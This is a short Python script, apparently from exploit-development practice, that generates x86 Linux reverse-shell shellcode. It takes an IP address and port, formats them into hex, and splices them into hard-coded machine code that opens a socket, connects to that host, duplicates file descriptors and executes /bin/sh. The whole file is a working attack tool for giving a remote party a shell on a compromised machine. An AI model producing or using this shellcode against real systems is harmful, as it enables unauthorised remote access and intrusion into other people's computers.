#!/usr/bin/env python3

from argparse import ArgumentParser
from socket import inet_aton
from binascii import hexlify
import sys

sc = ("\\x31\\xdb\\x53\\x6a\\x01\\x6a\\x02\\x89\\xe1\\x6a\\x66\\x58\\x43\\xcd"
      "\\x80\\x96\\x43\\x68{ip_address}\\x66\\x68{port}\\x66\\x53\\x43\\x89"
      "\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x87\\xde"
      "\\x29\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xd2\\x52"
      "\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xd1\\x89\\xe3"
      "\\xb0\\x0b\\xcd\\x80")

if __name__ == '__main__':
    parser = ArgumentParser(description="IPv4 Reverse Shell Generator")
    parser.add_argument('ip_address', type=str, nargs='?', default='127.1.1.1',
            help='The IP address to connect to (default 127.1.1.1)')
    parser.add_argument('port', type=int, nargs='?', default=1337,
            help='The port to connect to (default 1337)')
    args = parser.parse_args()

    ip = inet_aton(args.ip_address)
    ip_hex = hexlify(ip)

    if args.port < 1 or args.port > 65535:
        print('Invalid port. Please select a port between 1 and 65535')
        sys.exit(1)
    
    port = format(args.port, '04x')
    port = "\\x{b}\\x{a}".format(
            a=port[2:4],
            b=port[0:2]) 

    ip_formatted = "\\x{d}\\x{c}\\x{b}\\x{a}".format(
            a=ip_hex[6:8].decode('utf-8'),
            b=ip_hex[4:6].decode('utf-8'),
            c=ip_hex[2:4].decode('utf-8'),
            d=ip_hex[0:2].decode('utf-8'))

    if '\\x00' in port:
        print('[!] Warning: The port you chose contains a null value.')
    if '\\x00' in ip_formatted:
        print('[!] Warning: The IP address you chose contains a null value.')

    print('Shellcode:')
    print(sc.format(ip_address=str(ip_formatted), port=str(port)))
